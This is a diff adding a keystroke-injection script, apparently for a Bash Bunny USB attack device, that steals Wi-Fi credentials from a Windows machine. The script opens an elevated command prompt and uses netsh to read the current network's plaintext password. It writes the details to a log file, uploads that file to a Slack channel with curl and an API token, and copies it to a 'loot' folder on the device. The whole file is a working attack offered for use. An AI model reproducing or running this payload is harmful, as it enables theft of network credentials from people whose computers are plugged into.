@@ -1,0 +1,73 @@
+
+
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 2000
+LEFT
+DELAY 1000
+ENTER
+DELAY 1000
+
+STRING cd %userprofile%
+ENTER
+DELAY 100
+
+REM --> Getting SSID
+STRING cd "%TEMP%" & for /f "tokens=2 delims=: " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set A=%A
+ENTER
+DELAY 100
+REM --> Creating A.txt
+STRING netsh wlan show profiles %A% key=clear | findstr /c:"Network type" /c:"Authentication" /c:"Key Content" | findstr /v "broadcast" | findstr /v "Radio">>A.txt
+ENTER
+DELAY 100
+REM --> Get network type
+STRING for /f "tokens=3 delims=: " %A in ('findstr "Network type" A.txt') do set B=%A
+ENTER
+DELAY 100
+REM --> Get authentication
+STRING for /f "tokens=2 delims=: " %A in ('findstr "Authentication" A.txt') do set C=%A
+ENTER
+DELAY 100
+REM --> Get password
+STRING for /f "tokens=3 delims=: " %A in ('findstr "Key Content" A.txt') do set D=%A
+ENTER
+DELAY 100
+REM --> Delete A.txt
+STRING del A.txt
+ENTER
+
+DELAY 100
+REM --> Create Log.txt
+STRING echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt
+ENTER
+
+DELAY 100
+STRING curl -F file=@Log.txt -F "initial_comment=WIFI Cred" -F channels=<channel_ID> -H "Authorization: Bearer <SLACK-API-TOKEN>" https://slack.com/api/files.upload
+ENTER
+
+DELAY 500 
+REM Creates directory compromised of computer name, date and time
+REM %~d0 = path to this batch file. %COMPUTERNAME%, %date% and %time% pretty obvious
+STRING for /f %D in ('wmic volume get DriveLetter^, Label ^| find "BashBunny"') do set usb=%D
+ENTER
+DELAY 200
+ENTER
+
+REM Create directory on the bash bunny as wifi creds and computer name and date time stamp
+STRING set dst=%usb%\loot\WiFi_Creds\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%
+ENTER
+DELAY 200
+ENTER
+STRING mkdir %dst% >>nul
+ENTER
+
+REM Move the Log.txt to the created directory on the bash bunny
+STRING move Log.txt %dst% >>nul
+ENTER
+DELAY 100
+STRING exit
+ENTER
+
